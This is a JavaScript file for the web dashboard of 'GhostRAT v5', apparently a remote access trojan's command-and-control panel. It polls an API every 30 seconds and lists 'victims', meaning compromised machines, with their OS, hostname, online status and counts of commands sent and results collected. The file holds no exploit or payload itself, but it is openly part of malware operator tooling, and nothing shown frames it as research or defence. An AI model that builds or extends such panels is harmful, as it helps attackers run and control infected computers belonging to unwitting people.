/**
 * GhostRAT v5 — Dashboard JavaScript
 * Main dashboard: victim list, stats, polling.
 */

(function() {
    'use strict';

    // ── State ──────────────────────────────────────────────────────────────────

    let victims = [];
    let pollTimer = null;
    const POLL_INTERVAL = 30000; // 30 seconds

    // ── DOM References ─────────────────────────────────────────────────────────

    const victimGrid = document.getElementById('victimGrid');
    const emptyState = document.getElementById('emptyState');
    const statsRow = document.getElementById('statsRow');
    const refreshBtn = document.getElementById('refreshBtn');
    const pollStatus = document.getElementById('pollStatus');
    const lastPoll = document.getElementById('lastPoll');

    // ── Init ───────────────────────────────────────────────────────────────────

    document.addEventListener('DOMContentLoaded', () => {
        loadVictims();
        startPolling();

        refreshBtn.addEventListener('click', () => {
            loadVictims();
            updateLastPoll();
        });
    });

    // ── Data Loading ───────────────────────────────────────────────────────────

    async function loadVictims() {
        try {
            pollStatus.textContent = 'Fetching...';
            const resp = await fetch('/api/victims');
            if (!resp.ok) throw new Error('Failed to fetch victims');

            victims = await resp.json();
            renderVictims(victims);
            updateStats(victims);
            pollStatus.textContent = 'Polling';
            updateLastPoll();
        } catch (err) {
            console.error('[GhostRAT] Failed to load victims:', err);
            pollStatus.textContent = 'Error';
            pollStatus.classList.add('error');
        }
    }

    // ── Rendering ──────────────────────────────────────────────────────────────

    function renderVictims(list) {
        victimGrid.innerHTML = '';

        if (list.length === 0) {
            emptyState.style.display = 'block';
            statsRow.style.display = 'none';
            return;
        }

        emptyState.style.display = 'none';
        statsRow.style.display = 'flex';

        list.forEach(v => {
            const card = document.createElement('div');
            card.className = `victim-card ${v.status === 'online' ? 'online' : 'offline'}`;
            card.innerHTML = `
                <div class="victim-card-header">
                    <span class="victim-id">${escapeHtml(v.id)}</span>
                    <span class="status-dot ${v.status}"></span>
                </div>
                <div class="victim-card-body">
                    <div class="victim-meta">
                        <div class="meta-item">
                            <span class="meta-label">OS</span>
                            <span class="meta-value">${escapeHtml(v.os_info)}</span>
                        </div>
                        <div class="meta-item">
                            <span class="meta-label">Host</span>
                            <span class="meta-value">${escapeHtml(v.hostname)}</span>
                        </div>
                    </div>
                    <div class="victim-stats">
                        <div class="stat-mini">
                            <span class="stat-mini-value">${v.commands_received}</span>
                            <span class="stat-mini-label">Commands</span>
                        </div>
                        <div class="stat-mini">
                            <span class="stat-mini-value">${v.results_count}</span>
                            <span class="stat-mini-label">Results</span>
                        </div>
                    </div>
                    <div class="victim-timestamp">
                        Last: ${formatTime(v.last_heartbeat)}
                    </div>
                </div>
            `;
            card.addEventListener('click', () => {
                window.location.href = `/victim/${v.id}`;
            });
            victimGrid.appendChild(card);
        });
    }

    function updateStats(list) {
        const online = list.filter(v => v.status === 'online').length;
        const offline = list.filter(v => v.status !== 'online').length;
        const totalResults = list.reduce((sum, v) => sum + (v.results_count || 0), 0);

        document.getElementById('totalVictims').textContent = list.length;
        document.getElementById('onlineVictims').textContent = online;
        document.getElementById('offlineVictims').textContent = offline;
        document.getElementById('totalResults').textContent = totalResults;
    }

    // ── Polling ────────────────────────────────────────────────────────────────

    function startPolling() {
        if (pollTimer) clearInterval(pollTimer);
        pollTimer = setInterval(loadVictims, POLL_INTERVAL);
    }

    function updateLastPoll() {
        const now = new Date();
        lastPoll.textContent = `Last: ${now.toLocaleTimeString()}`;
    }

    // ── Helpers ────────────────────────────────────────────────────────────────

    function escapeHtml(str) {
        const div = document.createElement('div');
        div.textContent = str;
        return div.innerHTML;
    }

    function formatTime(isoStr) {
        if (!isoStr) return 'Never';
        try {
            const date = new Date(isoStr);
            const now = new Date();
            const diff = now - date;

            if (diff < 60000) return 'Just now';
            if (diff < 3600000) return `${Math.floor(diff / 60000)}m ago`;
            if (diff < 86400000) return `${Math.floor(diff / 3600000)}h ago`;
            return date.toLocaleDateString();
        } catch {
            return isoStr;
        }
    }

    // Expose for inline handlers
    window.formatTime = formatTime;
})();
